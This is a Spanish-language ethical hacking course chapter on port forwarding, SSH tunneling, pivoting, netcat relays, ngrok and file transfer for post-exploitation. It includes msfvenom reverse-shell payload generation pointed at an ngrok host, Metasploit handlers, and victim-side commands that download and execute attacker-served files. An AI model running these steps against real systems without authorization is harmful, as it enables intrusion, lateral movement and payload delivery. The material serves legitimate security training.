| **Inicio**         | **atr√°s 5**                                    | **Siguiente 7**                                            |
| ------------------ | ---------------------------------------------- | ---------------------------------------------------------- |
| [üè†](../README.md) | [‚è™](./5_5_Deteccion_y_Evasion_de_defensas.md) | [‚è©](./5_7_Hacking_Etico_en_entornos_reales_Amazon_AWS.md) |

---

## **√çndice**

| Temario                                                                                  |
| ---------------------------------------------------------------------------------------- |
| [352. Port Forwarding](#352-port-forwarding)                                             |
| [353. Port Forwarding con SSH](#353-port-forwarding-con-ssh)                             |
| [354. Pivoting](#354-pivoting)                                                           |
| [355. Netcat Port-Pivot Relay](#355-netcat-port-pivot-relay)                             |
| [356. Local Tunneling: LocalTunnel y Ngrok](#356-local-tunneling-localtunnel-y-ngrok)    |
| [357. Transferencia de ficheros](#357-transferencia-de-ficheros)                         |
| [358. T√©cnicas de transferencia de ficheros](#358-t√©cnicas-de-transferencia-de-ficheros) |

---

# **Hacking etico y post-explotacion avanzada**

## **352. Port Forwarding**

![Port Forwarding](../img/5_Hacking_Etico_y_Ciberseguridad_Avanzado/Port_Forwarding.jpg "Port Forwarding")

### üß† ¬øQu√© es el Port Forwarding?

**Port Forwarding** (o reenv√≠o de puertos) es una t√©cnica para **redirigir conexiones de red que llegan a un puerto de un sistema hacia otro sistema o puerto interno**.

Es decir, permite que **una m√°quina externa pueda acceder a un servicio interno** que normalmente no estar√≠a expuesto directamente.

---

### üì¶ ¬øD√≥nde se usa?

- Para **acceder a servicios detr√°s de NAT o firewall**.
- Para **exponer un servidor local a internet** (como un reverse shell).
- En pruebas de penetraci√≥n para acceder a **m√°quinas internas** de una red.
- Para enrutar tr√°fico de forma din√°mica con herramientas como `ssh`, `ngrok`, `socat`, `rinetd`, etc.

---

### üéØ Tipos de Port Forwarding

| Tipo                   | Descripci√≥n                                                               |
| ---------------------- | ------------------------------------------------------------------------- |
| **Local Forwarding**   | Redirige el tr√°fico desde la m√°quina local a otro host remoto.            |
| **Remote Forwarding**  | Permite a un host remoto conectarse a un puerto en la m√°quina local.      |
| **Dynamic Forwarding** | Crea un proxy SOCKS, redirigiendo tr√°fico din√°mico hacia varios destinos. |

---

### üß∞ Herramientas comunes

| Herramienta | Descripci√≥n r√°pida                                        |
| ----------- | --------------------------------------------------------- |
| `ssh`       | Muy usado para forwarding (local, remoto y din√°mico)      |
| `socat`     | Redirecciona puertos de forma flexible                    |
| `ngrok`     | Exponer un servicio local al exterior (muy usado en CTFs) |
| `rinetd`    | Reenv√≠o persistente entre IPs/puertos                     |
| `iptables`  | Reglas de reenv√≠o en Linux                                |

---

### üîß Instalaci√≥n de herramientas clave

#### 1. `socat` (Reenv√≠o flexible)

```bash
sudo apt install socat
```

#### 2. `rinetd` (Servicio permanente de port forwarding)

```bash
sudo apt install rinetd
```

#### 3. `ngrok` (Redireccionamiento p√∫blico)

```bash
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
sudo mv ngrok /usr/local/bin/
```

---

### üß™ Ejemplo completo 1: Redireccionar un reverse shell con `socat`

#### üî• Escenario:

Est√°s en una red interna y lograste una shell inversa (reverse shell) desde una v√≠ctima A. Pero la v√≠ctima A no tiene acceso externo. T√∫ puedes usar **una m√°quina B como pivote**.

```
Atacante <--> M√°quina puente (B) <--> V√≠ctima (A)
```

#### Paso 1: En m√°quina B (puente), redirige el puerto

```bash
socat TCP-LISTEN:4444,fork TCP:192.168.1.100:4444
```

Esto redirige todas las conexiones entrantes al puerto `4444` de B hacia la v√≠ctima (IP 192.168.1.100).

---

#### Paso 2: En la m√°quina atacante

Inicia Metasploit:

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <IP de m√°quina puente B>
set LPORT 4444
exploit
```

Cuando la v√≠ctima se conecte a B, el tr√°fico llegar√° a ti.

---

### üß™ Ejemplo completo 2: Usar `ngrok` para exponer un servicio local

Sup√≥n que tienes un listener de Metasploit en Kali:

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 4444
exploit
```

Ahora quieres exponer ese puerto 4444 a internet con `ngrok`.

#### Paso 1: Ejecutar ngrok

```bash
ngrok tcp 4444
```

Te devolver√° algo como:

```
tcp://0.tcp.ngrok.io:13745 -> localhost:4444
```

Ese `tcp://0.tcp.ngrok.io:13745` ser√° la direcci√≥n a la que el payload de la v√≠ctima se conectar√°.

#### Paso 2: Crear tu payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=13745 -f exe > shell.exe
```

Al ejecutar ese payload en una m√°quina remota, obtendr√°s la shell aunque est√©s detr√°s de NAT.

---

### üß™ Ejemplo completo 3: Port forwarding persistente con `rinetd`

1. Edita el archivo de configuraci√≥n:

```bash
sudo nano /etc/rinetd.conf
```

2. Agrega:

```
0.0.0.0 8080 192.168.1.100 80
```

Esto significa: redirige cualquier conexi√≥n al puerto `8080` del sistema actual a `192.168.1.100:80`.

3. Reinicia el servicio:

```bash
sudo systemctl restart rinetd
```

---

### üõ°Ô∏è Uso en Ciberseguridad

#### üîì En Pentesting:

- **Pivoting**: acceder a m√°quinas internas usando port forwarding sobre un host comprometido.
- **Reversing con NAT**: cuando la v√≠ctima no tiene IP p√∫blica.
- **Evadir firewalls**: reenviar tr√°fico que de otra manera estar√≠a bloqueado.

---

### üß† Resumen

| T√©cnica                                        | Ejemplo                         |
| ---------------------------------------------- | ------------------------------- |
| `ssh -L`                                       | Local forwarding                |
| `ssh -R`                                       | Remote forwarding               |
| `socat TCP-LISTEN:4444 TCP:192.168.1.100:4444` | Manual enrutamiento             |
| `ngrok tcp 4444`                               | Exposici√≥n temporal en internet |
| `rinetd`                                       | Servicio persistente            |

---

### üö® Advertencia legal

> Estas t√©cnicas deben usarse **solo en entornos controlados, laboratorios personales o sistemas con autorizaci√≥n**.
>
> Usar port forwarding para evadir firewalls corporativos sin permiso **es ilegal**.

---

[üîº](#√≠ndice)

---

## **353. Port Forwarding con SSH**

### üß† ¬øQu√© es el Port Forwarding con SSH?

El **port forwarding con SSH** permite redirigir tr√°fico a trav√©s de un t√∫nel cifrado SSH para:

- Acceder a servicios remotos de forma segura
- Bypassear firewalls o NAT
- Realizar **pivoting** en pruebas de penetraci√≥n

---

### üéØ ¬øPara qu√© sirve?

- Acceder a servicios **protegidos por firewalls**
- Hacer tunneling de puertos como **MySQL, RDP, Redis, VNC, etc.**
- Crear **proxies SOCKS5** para navegar por otras redes
- En pentesting: acceder a servicios internos de una red comprometida

---

### üì¶ Tipos de Port Forwarding con SSH

| Tipo         | Comando  | ¬øQu√© hace?                                                 |
| ------------ | -------- | ---------------------------------------------------------- |
| **Local**    | `ssh -L` | Redirige tr√°fico desde tu m√°quina hacia un servidor remoto |
| **Remoto**   | `ssh -R` | Permite al host remoto acceder a tu m√°quina local          |
| **Din√°mico** | `ssh -D` | Crea un proxy SOCKS para enrutar tr√°fico din√°micamente     |

---

### üõ†Ô∏è Requisitos

- Acceso a un servidor SSH (puede ser Linux, VPS, VM, etc.)
- Cliente SSH instalado (por defecto en Linux y macOS, en Windows se usa PowerShell, PuTTY o `ssh.exe`)
- Puertos abiertos en destino

---

### ‚úÖ Ejemplo 1: Local Forwarding (acceder a un servicio remoto localmente)

---

#### üî• Escenario:

Tu servidor remoto (VPS) tiene una base de datos MySQL corriendo en `localhost:3306`, y el firewall bloquea conexiones externas.

T√∫ quieres acceder desde tu PC a ese MySQL **como si estuviera en tu m√°quina local**.

---

#### üß™ Comando:

```bash
ssh -L 3336:localhost:3306 usuario@vps-remoto
```

üìå Significado:

- `-L` ‚Üí Local forwarding
- `3336` ‚Üí Puerto en tu m√°quina local
- `localhost:3306` ‚Üí Servicio remoto al que quieres acceder
- `usuario@vps-remoto` ‚Üí Usuario SSH y direcci√≥n del servidor

---

#### ‚úÖ Uso pr√°ctico:

Ahora, desde tu PC puedes conectarte as√≠:

```bash
mysql -h 127.0.0.1 -P 3336 -u root -p
```

Esto conecta con el **MySQL remoto** como si estuviera local.

---

### ‚úÖ Ejemplo 2: Remote Forwarding (exponer un puerto local al servidor remoto)

---

#### üî• Escenario:

Tu m√°quina est√° detr√°s de un NAT, pero quieres permitir que tu servidor remoto se conecte a tu servicio local (por ejemplo, un servidor web en el puerto 8080).

---

### üß™ Comando:

```bash
ssh -R 9090:localhost:8080 usuario@vps-remoto
```

üìå Significado:

- `-R` ‚Üí Remote forwarding
- `9090` ‚Üí Puerto en el VPS
- `localhost:8080` ‚Üí Servicio corriendo en tu m√°quina local

---

#### ‚úÖ Uso pr√°ctico:

En el servidor remoto (VPS), puedes hacer:

```bash
curl http://localhost:9090
```

Y ver√°s el contenido del servidor local expuesto por el t√∫nel.

---

### ‚úÖ Ejemplo 3: Dynamic Forwarding (crear un proxy SOCKS)

---

#### üî• Escenario:

Quieres enrutar todo el tr√°fico de tu navegador a trav√©s de un servidor VPS, como si fuera una VPN.

---

#### üß™ Comando:

```bash
ssh -D 9050 usuario@vps-remoto
```

üìå Esto crea un **proxy SOCKS5** local en tu m√°quina, escuchando en el puerto `9050`.

---

#### ‚úÖ Configuraci√≥n:

En tu navegador (Firefox, Chrome con plugin), configuras:

```
Proxy SOCKS5
Host: 127.0.0.1
Puerto: 9050
```

¬°Y listo! Est√°s navegando como si estuvieras desde el VPS.

---

### üì¶ Instalaci√≥n de cliente SSH (si no lo tienes)

#### En Linux:

Ya viene instalado. Si no:

```bash
sudo apt install openssh-client
```

#### En Windows:

Abre PowerShell o CMD:

```bash
ssh usuario@IP_remota
```

Si no est√°, puedes instalar el cliente OpenSSH desde:

```
Configuraci√≥n ‚Üí Aplicaciones ‚Üí Caracter√≠sticas opcionales ‚Üí OpenSSH Client
```

---

### üß™ Ejemplo completo final: Acceder a un servidor interno a trav√©s de una m√°quina comprometida

---

#### üî• Escenario:

- ‚úÖ Has comprometido una m√°quina Linux (`host-comprometido`) en una red interna.
- üéØ Quieres acceder desde tu PC a un servicio web que corre en `192.168.10.5:80`, solo accesible desde dentro de esa red.

---

#### üß™ Soluci√≥n con SSH:

Desde tu PC:

```bash
ssh -L 8080:192.168.10.5:80 usuario@host-comprometido
```

---

#### ‚úÖ Resultado:

Ahora puedes abrir tu navegador en:

```
http://localhost:8080
```

Y ver√°s el sitio web de `192.168.10.5`, ¬°aunque t√∫ est√°s fuera de la red!

---

### üß† Resumen r√°pido

| Objetivo                            | Comando                                                 |
| ----------------------------------- | ------------------------------------------------------- |
| Reenviar un servicio remoto a local | `ssh -L <local_port>:<host>:<remote_port> user@host`    |
| Exponer un servicio local en remoto | `ssh -R <remote_port>:localhost:<local_port> user@host` |
| Proxy SOCKS din√°mico (tipo VPN)     | `ssh -D <local_port> user@host`                         |

---

### ‚ö†Ô∏è Seguridad y legalidad

- Estas t√©cnicas deben usarse **solo con autorizaci√≥n**.
- En pentesting, esto es ideal para **pivoting** y acceso lateral dentro de redes.
- El SSH tunneling puede evadir firewalls, as√≠ que **no lo uses en redes que no controlas**.

---

[üîº](#√≠ndice)

---

## **354. Pivoting**

![Pivoting](../img/5_Hacking_Etico_y_Ciberseguridad_Avanzado/Pivoting.png "Pivoting")

### üß† ¬øQu√© es el Pivoting?

**Pivoting** (o pivotaci√≥n) es una t√©cnica usada por los pentesters o atacantes para **moverse lateralmente dentro de una red interna**, despu√©s de comprometer una m√°quina.

> Permite usar una m√°quina comprometida como **puente (pivot)** para acceder a otras m√°quinas **que no est√°n accesibles directamente** desde el exterior.

---

### üéØ ¬øCu√°ndo se usa?

Cuando:

- Hay una red interna inaccesible desde tu PC
- Ya tienes acceso (por ejemplo, shell o meterpreter) a **una m√°quina dentro de esa red**
- Quieres alcanzar m√°quinas detr√°s del firewall o en subredes privadas

---

### üõ†Ô∏è Tipos de Pivoting

| Tipo                  | Descripci√≥n                                                    | Herramientas comunes                 |
| --------------------- | -------------------------------------------------------------- | ------------------------------------ |
| **Pivoting est√°tico** | Redirige puertos fijos                                         | `SSH`, `iptables`, `rinetd`          |
| **Pivoting din√°mico** | Redirige cualquier puerto (tipo proxy)                         | `Proxychains`, `Metasploit`, `SOCKS` |
| **VPN pivoting**      | Te conectas virtualmente como si fueras parte de la red remota | `OpenVPN`, `Meterpreter VPN`         |

---

### ‚úÖ Herramientas para Pivoting

| Herramienta   | ¬øQu√© hace?                                                                     |
| ------------- | ------------------------------------------------------------------------------ |
| `Metasploit`  | Proxy SOCKS4 din√°mico con `autoroute` y `socks4a`                              |
| `SSH`         | Forwarding de puertos (`-L`, `-R`, `-D`)                                       |
| `Proxychains` | Redirige cualquier programa a trav√©s de un proxy (como el de Metasploit o SSH) |
| `chisel`      | Crea t√∫neles r√°pidos y ligeros TCP/HTTP                                        |
| `socat`       | Redirige puertos a nivel de sistema                                            |

---

### ‚úÖ Instalaci√≥n b√°sica de herramientas

#### En Kali Linux

```bash
sudo apt update
sudo apt install metasploit-framework proxychains4 ssh nmap
```

#### Para usar `chisel` (cliente/servidor):

```bash
# En Kali
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
gunzip chisel_1.8.1_linux_amd64.gz
chmod +x chisel_1.8.1_linux_amd64
mv chisel_1.8.1_linux_amd64 /usr/local/bin/chisel
```

---

### üî• Ejemplo completo paso a paso: Pivoting con Metasploit + Proxychains

---

#### üß™ Escenario

- Tu m√°quina: `Kali Linux` (externa)
- Red interna de la v√≠ctima: `192.168.10.0/24`
- M√°quina comprometida (pivot): `192.168.10.10`
- Objetivo escondido: `192.168.10.20` (solo accesible desde la m√°quina pivot)
- Quieres escanear o acceder a esa m√°quina

---

#### 1. Obtener acceso (ya sea por Meterpreter, SSH o netcat)

Supongamos que ya tienes una **session Meterpreter** en `192.168.10.10`.

---

#### 2. Cargar el m√≥dulo `autoroute` en Metasploit

```bash
meterpreter > background
msf6 > use post/multi/manage/autoroute
msf6 post(autoroute) > set SESSION 1
msf6 post(autoroute) > run
```

Esto te permite enrutar tr√°fico hacia la red interna `192.168.10.0/24`.

---

#### 3. Iniciar el proxy SOCKS

```bash
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(socks_proxy) > run
```

Por defecto corre en el puerto `1080`.

---

#### 4. Configurar Proxychains

Edita el archivo:

```bash
sudo nano /etc/proxychains4.conf
```

Y al final agrega:

```
socks4 127.0.0.1 1080
```

Guarda y sal.

---

#### 5. Usar herramientas a trav√©s del t√∫nel

Ejemplo para escanear la m√°quina oculta `192.168.10.20`:

```bash
proxychains nmap -sT -Pn -p 22,80 192.168.10.20
```

Tambi√©n puedes usar `netcat`, `curl`, `xfreerdp`, `firefox`, etc.

```bash
proxychains curl http://192.168.10.20
```

¬°Y listo! Est√°s accediendo a la red interna a trav√©s del host comprometido.

---

### üîÑ Alternativa: Pivoting con SSH

Si comprometiste un usuario con acceso SSH en una m√°quina de la red interna, puedes hacer:

```bash
ssh -D 1080 usuario@192.168.10.10
```

Y luego usar `proxychains` igual que arriba.

---

### üß† Resumen

- **Pivoting** permite moverse lateralmente en una red a trav√©s de una m√°quina comprometida.
- Puedes usar:

  - `Metasploit` + `autoroute` + `socks_proxy`
  - `SSH -D` + `proxychains`
  - `Chisel` para tunelizaci√≥n personalizada

- Ideal para enumerar redes internas, explotar otras m√°quinas y moverse en entornos segmentados.

---

### ‚ö†Ô∏è Legalidad y √âtica

> Esta t√©cnica **debe usarse solo con fines educativos o con permiso expl√≠cito**.
>
> Usarla sin autorizaci√≥n puede ser ilegal y tiene consecuencias graves.

---

[üîº](#√≠ndice)

---

## **355. Netcat Port-Pivot Relay**

### üß† ¬øQu√© es Netcat Port-Pivot Relay?

Es una t√©cnica que usa **Netcat** para redirigir tr√°fico de una m√°quina intermedia (que **s√≠** tiene acceso a una red interna) hacia un objetivo que **no puedes alcanzar directamente**.

> Es √∫til cuando has comprometido una m√°quina que **puede ver una red interna**, y t√∫ **quieres acceder a esa red desde fuera**, usando esa m√°quina como **puente (relay)**.

---

### üìå Escenario t√≠pico

Imagina esta red:

```
Tu Kali  -->  [M√°quina pivot: 10.0.2.15]  -->  [Objetivo interno: 192.168.1.100:22]
```

- Solo la m√°quina _pivot_ puede ver a `192.168.1.100`.
- T√∫ quieres conectarte al puerto 22 del objetivo (por ejemplo, para hacer SSH o escaneo).

Soluci√≥n: usar Netcat como un **relay TCP**.

---

### üß∞ ¬øQu√© necesitas?

- Acceso a la m√°quina pivot: ya sea con `netcat`, `meterpreter`, `ssh`, `reverse shell`, etc.
- Tener instalado `netcat` (normalmente ya viene por defecto en Kali y Linux).
- Habilitar el puerto relay en la m√°quina pivot con Netcat.
- Redirigir tu tr√°fico a ese puerto desde tu m√°quina.

---

### ‚úÖ Instalaci√≥n de Netcat

En Kali o Debian:

```bash
sudo apt update
sudo apt install netcat
```

---

### üî• Ejemplo completo: Relay con Netcat

#### üéØ Objetivo

Conectarte desde tu Kali al servicio SSH que corre en `192.168.1.100:22`, usando la m√°quina pivot `10.0.2.15` como puente.

---

#### Paso 1: Acceso a la m√°quina intermedia

Sup√≥n que tienes shell o acceso por SSH:

```bash
ssh usuario@10.0.2.15
```

---

#### Paso 2: Crear relay con Netcat en la m√°quina pivot

En la shell de la m√°quina pivot:

```bash
nc -lvnp 2222 -c "nc 192.168.1.100 22"
```

üîç Esto hace lo siguiente:

- Escucha en el puerto `2222` en `10.0.2.15`.
- Todo lo que reciba en `2222`, lo reenv√≠a a `192.168.1.100:22`.

---

#### Paso 3: Conectarte desde tu Kali

En tu m√°quina Kali:

```bash
nc 10.0.2.15 2222
```

¬°Y estar√°s hablando directamente con el puerto 22 del host interno!

Si todo sale bien, ver√°s algo como:

```
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
```

---

### üì¶ Variaci√≥n: convertirlo en un t√∫nel "general" para otros puertos

Quieres escanear un puerto 80 o 445 interno:

```bash
# En la pivot:
nc -lvnp 8888 -c "nc 192.168.1.100 80"
```

Desde Kali:

```bash
curl http://10.0.2.15:8888
```

O para escanear:

```bash
nmap -p80 10.0.2.15
```

Est√°s en realidad escaneando `192.168.1.100:80`, gracias al relay.

---

### ‚ö†Ô∏è Problemas comunes y soluciones

| Problema               | Soluci√≥n                                                              |
| ---------------------- | --------------------------------------------------------------------- |
| Netcat no soporta `-c` | Usa `ncat` de Nmap o compila Netcat tradicional                       |
| El puerto est√° cerrado | Aseg√∫rate de que Netcat est√© escuchando y el firewall permita tr√°fico |
| No se reenv√≠a bien     | Usa `socat` como alternativa (m√°s robusto)                            |

---

### üöÄ Alternativa con `socat` (m√°s potente)

En la pivot:

```bash
socat TCP-LISTEN:2222,fork TCP:192.168.1.100:22
```

Desde Kali:

```bash
nc 10.0.2.15 2222
```

---

### üß† Recapitulando

| Elemento        | Descripci√≥n                                          |
| --------------- | ---------------------------------------------------- |
| T√©cnica         | Port pivoting con Netcat                             |
| Herramienta     | `nc -lvnp <puerto> -c "nc <IP interna> <puerto>"`    |
| Uso             | Redirigir tr√°fico hacia objetivos internos           |
| Escenario com√∫n | Moverse lateralmente dentro de una red               |
| Alternativas    | `socat`, `chisel`, `metasploit + socks`, `SSH -L/-R` |

---

### ‚öñÔ∏è Aviso √©tico

> Esta t√©cnica es v√°lida solo en **entornos controlados, de laboratorio, o con permisos expl√≠citos**.
>
> Usarla contra sistemas sin autorizaci√≥n es **ilegal y sancionado penalmente**.

---

[üîº](#√≠ndice)

---

## **356. Local Tunneling: LocalTunnel y Ngrok**

### üåê ¬øQu√© es el Local Tunneling?

Es una t√©cnica que te permite exponer **una aplicaci√≥n que corre en tu m√°quina local** (por ejemplo, `http://localhost:3000`) a trav√©s de **Internet**, usando un t√∫nel seguro.

Esto es √∫til para:

- Probar un webhook (como los de Stripe, Discord, etc.)
- Compartir tu app local con alguien sin subirla a producci√≥n
- Recibir tr√°fico del exterior sin configurar puertos en tu router

---

### üîß Herramientas m√°s usadas

| Herramienta     | ¬øQu√© hace?                                                                           |
| --------------- | ------------------------------------------------------------------------------------ |
| **LocalTunnel** | Abre un t√∫nel HTTP de tu `localhost` hacia una URL p√∫blica gratis                    |
| **Ngrok**       | Abre t√∫neles seguros (HTTP, TCP, etc.) con m√°s opciones, autenticaci√≥n, estad√≠sticas |

---

### üß∞ Parte 1: **LocalTunnel**

---

#### ‚úÖ Instalaci√≥n

Necesitas tener [Node.js](https://nodejs.org/) instalado.

1. Instala LocalTunnel globalmente:

```bash
npm install -g localtunnel
```

Verifica que se instal√≥ correctamente:

```bash
lt --help
```

---

#### üß™ Ejemplo pr√°ctico

Sup√≥n que tienes una app corriendo en tu m√°quina local en el puerto `3000`:

```bash
npm run dev
```

Ahora exponla al mundo:

```bash
lt --port 3000
```

Resultado:

```bash
your url is: https://kxiujdzg.loca.lt
```

Esa URL es **p√∫blica**, cualquiera puede acceder a ella mientras el t√∫nel est√© activo.

Tambi√©n puedes personalizar el subdominio (si est√° libre):

```bash
lt --port 3000 --subdomain miappguss
```

‚Üí Resultado: `https://miappguss.loca.lt`

---

#### üìå Ventajas

- F√°cil, sin cuenta
- Gratis
- Ideal para proyectos r√°pidos

---

### üöÄ Parte 2: **Ngrok**

---

#### ‚úÖ Instalaci√≥n

1. Ve a [https://ngrok.com/](https://ngrok.com/) y crea una cuenta (gratis).
2. Descarga Ngrok seg√∫n tu sistema operativo.
3. Extrae el archivo y col√≥calo en una carpeta del PATH (por ejemplo `/usr/local/bin/` en Linux).

O bien:

```bash
# En Linux:
curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && \
echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list && \
sudo apt update && sudo apt install ngrok
```

4. Autenticar tu cuenta con tu token:

```bash
ngrok config add-authtoken TU_TOKEN
```

---

#### üß™ Ejemplo pr√°ctico

Sup√≥n que tu servidor local corre en el puerto `3000`:

```bash
ngrok http 3000
```

Ver√°s algo como:

```bash
Forwarding  https://3a62-181-65-15-89.ngrok-free.app -> http://localhost:3000
```

Abres esa URL en el navegador y est√°s viendo tu app local a trav√©s de Internet.

---

#### üîê Funcionalidades extra de Ngrok

- **T√∫neles TCP** (ej. SSH, RDP):

  ```bash
  ngrok tcp 22
  ```

- **Inspecci√≥n de tr√°fico web** (¬°genial para pentesting!):

  [http://127.0.0.1:4040](http://127.0.0.1:4040) te muestra todo lo que pasa por el t√∫nel.

- **Autenticaci√≥n b√°sica**:

  ```bash
  ngrok http -auth="user:pass" 3000
  ```

- **Subdominios personalizados (con plan Pro)**

---

### üîç Comparativa r√°pida

| Caracter√≠stica      | LocalTunnel | Ngrok                        |
| ------------------- | ----------- | ---------------------------- |
| Gratis              | S√≠          | S√≠ (limitado)                |
| Requiere cuenta     | No          | S√≠                           |
| Soporta TCP         | No          | S√≠                           |
| Soporta subdominios | Limitado    | Solo en planes pagos         |
| Dashboard web       | No          | S√≠                           |
| An√°lisis tr√°fico    | No          | S√≠ (`http://localhost:4040`) |

---

### üß† Recapitulaci√≥n

- **LocalTunnel** es m√°s simple, ideal para pruebas r√°pidas
- **Ngrok** es m√°s robusto, con autenticaci√≥n, estad√≠sticas, y soporte para TCP

---

### üéØ Ejemplo completo para ambos

#### Sup√≥n que tienes una app de React en el puerto `5173`:

```bash
npm run dev
```

##### ‚û§ Con LocalTunnel:

```bash
lt --port 5173
```

‚Üí Resultado: `https://abcxyz.loca.lt`

##### ‚û§ Con Ngrok:

```bash
ngrok http 5173
```

‚Üí Resultado: `https://1234-201-45-67-89.ngrok-free.app`

¬°Listo! Ambas URL est√°n redirigiendo a tu frontend local en React sin necesidad de desplegar nada en Vercel o Render.

---

[üîº](#√≠ndice)

---

## **357. Transferencia de ficheros**

### üß† ¬øQu√© es la transferencia de ficheros?

La **transferencia de ficheros** es el proceso de **mover archivos entre dos sistemas** a trav√©s de una red.

Esto puede ser:

- De una m√°quina atacante (Kali) hacia una m√°quina v√≠ctima (para subir un script o binario).
- Desde una m√°quina comprometida hacia tu m√°quina (para robar informaci√≥n o extraer resultados).
- Entre servidores en una red interna o hacia/desde Internet.

---

### üîß Herramientas comunes para transferencia de ficheros

| Herramienta                 | ¬øPara qu√© sirve?                                   | Protocolo |
| --------------------------- | -------------------------------------------------- | --------- |
| **Python HTTP server**      | Servir archivos desde tu m√°quina                   | HTTP      |
| **`curl` o `wget`**         | Descargar archivos en la m√°quina remota            | HTTP      |
| **Netcat**                  | Transferir binarios, scripts o cualquier cosa      | TCP       |
| **SCP / SFTP**              | Transferencia segura entre m√°quinas (requiere SSH) | SSH       |
| **Impacket (smbserver.py)** | Compartir archivos v√≠a SMB (Windows)               | SMB       |
| **FTP (vsftpd)**            | Subir o bajar archivos en red                      | FTP       |

---

### üì¶ Parte 1: Python HTTP Server + curl/wget (m√°s com√∫n)

#### ‚úÖ Instalaci√≥n

Python ya viene instalado en la mayor√≠a de sistemas. Para iniciar un servidor HTTP:

```bash
# Si usas Python 3:
python3 -m http.server 8000
```

Esto sirve todos los archivos del directorio actual a trav√©s de `http://<tu-ip>:8000`

---

#### üíª Ejemplo completo

##### üñ•Ô∏è En tu m√°quina (Kali o atacante):

Sup√≥n que tienes un archivo llamado `payload.exe` que quieres enviar:

```bash
cd /ruta/del/archivo
python3 -m http.server 8000
```

##### üßë‚Äçüíª En la m√°quina v√≠ctima (Linux o Windows con curl o wget):

Descargar el archivo usando `curl`:

```bash
curl http://<IP-del-atacante>:8000/payload.exe -o payload.exe
```

O usando `wget`:

```bash
wget http://<IP-del-atacante>:8000/payload.exe
```

---

### üîå Parte 2: Transferencia con Netcat (√∫til cuando no hay wget/curl)

#### ‚úÖ Instalaci√≥n

Netcat suele venir preinstalado. Si no:

```bash
sudo apt install netcat
```

---

#### üíª Ejemplo completo

##### üñ•Ô∏è Desde el atacante (enviar archivo):

```bash
nc -lvnp 4444 < payload.exe
```

Esto espera una conexi√≥n entrante en el puerto 4444 y **env√≠a el archivo**.

##### üßë‚Äçüíª En la m√°quina v√≠ctima (recibir el archivo):

```bash
nc <IP-del-atacante> 4444 > payload.exe
```

‚ö†Ô∏è Aseg√∫rate de usar `>` en la v√≠ctima y `<` en el atacante.

---

### üîê Parte 3: Transferencia con SCP (si hay SSH)

#### ‚úÖ Instalaci√≥n

Ya suele estar instalado. Si no:

```bash
sudo apt install openssh-client
```

#### üíª Ejemplo

Desde tu m√°quina:

```bash
scp payload.py usuario@IP-v√≠ctima:/tmp/
```

O desde la v√≠ctima para traerse archivos:

```bash
scp usuario@IP-atacante:/home/kali/script.sh .
```

---

### üñ•Ô∏è Parte 4: SMB con `smbserver.py` (Impacket)

#### ‚úÖ Instalaci√≥n

Primero instala Impacket (si a√∫n no lo tienes):

```bash
pip install impacket
```

Luego:

```bash
impacket-smbserver share /ruta/del/archivo -smb2support
```

Desde Windows (v√≠ctima):

```powershell
copy \\<IP-del-atacante>\share\archivo.exe .
```

---

### üìÅ Parte 5: FTP r√°pido (si no hay opciones)

En el atacante:

```bash
sudo apt install vsftpd
python3 -m pyftpdlib -p 21
```

Desde la v√≠ctima:

```bash
ftp <IP-del-atacante>
# login como anonymous, luego usa get nombre_de_archivo
```

---

### üß† Recapitulaci√≥n

| M√©todo                         | Usa  | Ventajas                          | Desventajas                      |
| ------------------------------ | ---- | --------------------------------- | -------------------------------- |
| Python HTTP Server + curl/wget | HTTP | Muy r√°pido y f√°cil                | Requiere acceso HTTP y curl/wget |
| Netcat                         | TCP  | Funciona en sistemas sin curl     | No encriptado                    |
| SCP/SFTP                       | SSH  | Seguro, cifrado                   | Requiere SSH y credenciales      |
| SMB (smbserver.py)             | SMB  | Ideal para v√≠ctimas Windows       | Detectable por antivirus         |
| FTP                            | FTP  | Funciona si no hay otras opciones | Inseguro, sin cifrado            |

---

### ‚úÖ Ejemplo completo paso a paso

#### üéØ Objetivo

Enviar `script.sh` desde tu Kali a una m√°quina Linux v√≠ctima que **solo tiene Netcat** y no tiene acceso a Internet.

#### üîΩ En Kali (atacante):

```bash
nc -lvnp 9001 < script.sh
```

#### üîº En la v√≠ctima (ya comprometida, shell activa):

```bash
nc <IP-de-Kali> 9001 > script.sh
chmod +x script.sh
./script.sh
```

---

[üîº](#√≠ndice)

---

## **358. T√©cnicas de transferencia de ficheros**

### üß† ¬øQu√© es la transferencia de ficheros?

Es el proceso de **mover archivos de una m√°quina a otra a trav√©s de una red**, ya sea:

- De tu m√°quina a un servidor o v√≠ctima (subida).
- De una m√°quina v√≠ctima o remota hacia ti (descarga).

Estas t√©cnicas se usan en:

- Desarrollo y pruebas de servidores.
- Automatizaci√≥n de backups.
- Ciberseguridad: post-explotaci√≥n, entrega de payloads, exfiltraci√≥n de datos, etc.

---

### üîß T√©cnicas m√°s usadas

Las t√©cnicas m√°s comunes pueden clasificarse seg√∫n el **protocolo o herramienta usada**. Aqu√≠ te explico las m√°s pr√°cticas.

---

#### 1. üêç Python HTTP Server + `curl`/`wget` (r√°pido y universal)

Sirve para **enviar archivos a otras m√°quinas** usando un servidor HTTP simple.

##### üì¶ Instalaci√≥n:

Solo necesitas tener Python 3 y `curl` o `wget` en la otra m√°quina.

##### ‚ñ∂Ô∏è Uso:

**Servidor (en tu m√°quina):**

```bash
python3 -m http.server 8000
```

Esto sirve los archivos del directorio actual por `http://TU-IP:8000`

**Cliente (en la m√°quina remota o v√≠ctima):**

```bash
curl http://TU-IP:8000/fichero.txt -o fichero.txt
```

O:

```bash
wget http://TU-IP:8000/fichero.txt
```

---

#### 2. üîå Netcat (transferencia binaria simple)

Muy √∫til cuando no tienes ni `curl` ni `wget`.

##### üì¶ Instalaci√≥n:

```bash
sudo apt install netcat
```

